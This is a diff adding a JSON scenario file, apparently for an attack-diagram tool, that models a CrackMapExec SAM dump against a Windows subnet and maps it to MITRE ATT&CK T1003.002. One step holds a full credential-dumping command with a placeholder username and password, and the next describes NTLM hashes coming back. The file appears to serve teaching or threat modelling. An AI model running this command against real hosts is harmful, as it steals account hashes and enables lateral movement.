@@ -1,0 +1,67 @@
+{
+  "title": "CME SAM Dump (CrackMapExec)",
+  "version": "3.0",
+  "entities": [
+    {
+      "id": "attacker_machine",
+      "label": "Attacker Environment",
+      "type": "container",
+      "icon": "IconKali",
+      "members": [
+        "cme_tool",
+        "stolen_sam_hashes"
+      ]
+    },
+    {
+      "id": "cme_tool",
+      "label": "CrackMapExec",
+      "type": "node",
+      "icon": "IconTerminal"
+    },
+    {
+      "id": "stolen_sam_hashes",
+      "label": "Local Admin Hashes",
+      "type": "node",
+      "icon": "IconKey"
+    },
+    {
+      "id": "corporate_network",
+      "label": "Target Subnet (10.0.2.0/24)",
+      "type": "container",
+      "icon": "IconNetwork",
+      "members": [
+        "target_windows"
+      ]
+    },
+    {
+      "id": "target_windows",
+      "label": "Target Windows Hosts",
+      "type": "node",
+      "icon": "IconWorkstation"
+    }
+  ],
+  "steps": [
+    {
+      "id": 1,
+      "name": "SMB Auth & Secrets Dump",
+      "type": "edge",
+      "from": "cme_tool",
+      "to": "target_windows",
+      "description": "CME authenticates to the target subnet via SMB and executes a remote OS credential dump.",
+      "cli": "crackmapexec smb 10.0.2.0/24 -u \"Frank Castle\" -p \"Password\" --sam",
+      "mitre": {
+        "id": "T1003.002",
+        "tactic": "Credential Access",
+        "technique": "OS Credential Dumping: Security Account Manager"
+      }
+    },
+    {
+      "id": 2,
+      "name": "Return NTLM Hashes",
+      "type": "edge",
+      "from": "target_windows",
+      "to": "stolen_sam_hashes",
+      "description": "The target returns the decrypted NTLM hashes of all local accounts (RID 500, etc)."
+    }
+  ]
+}
